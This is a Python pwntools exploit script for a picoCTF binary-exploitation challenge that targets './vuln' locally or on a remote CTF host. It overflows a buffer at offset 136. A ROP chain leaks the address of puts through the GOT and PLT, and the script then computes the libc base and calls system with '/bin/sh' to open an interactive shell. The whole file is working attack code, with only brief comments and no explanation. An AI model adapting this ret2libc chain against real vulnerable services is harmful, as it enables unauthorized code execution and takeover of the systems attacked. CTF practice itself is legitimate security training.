#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
libc = './libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
host, port = 'mercury.picoctf.net', 62289

def start(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = start()
rop = ROP(exe)

# Got manually through cyclic gdb-pwndbg
offset = 136

# flattening  payload here
payload = flat({
    offset: [
        rop.rdi.address,
        elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main']
    ]
})

# sending payload
io.sendlineafter(b'sErVeR!', payload)
io.recvlines(2)
leak = unpack(io.recv(6).ljust(8, b'\x00'))

libc.address = leak - libc.sym['puts']
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym['system']

info("got puts: %#x", leak)
info("libc base: %#x", libc.address)
info("binsh: %#x", binsh)
info("system: %#x", system)

payload = flat({
    offset: [
        rop.rdi.address,
        binsh,
        rop.ret.address,
        system
    ]
})

io.sendlineafter(b'sErVeR!', payload)

io.interactive()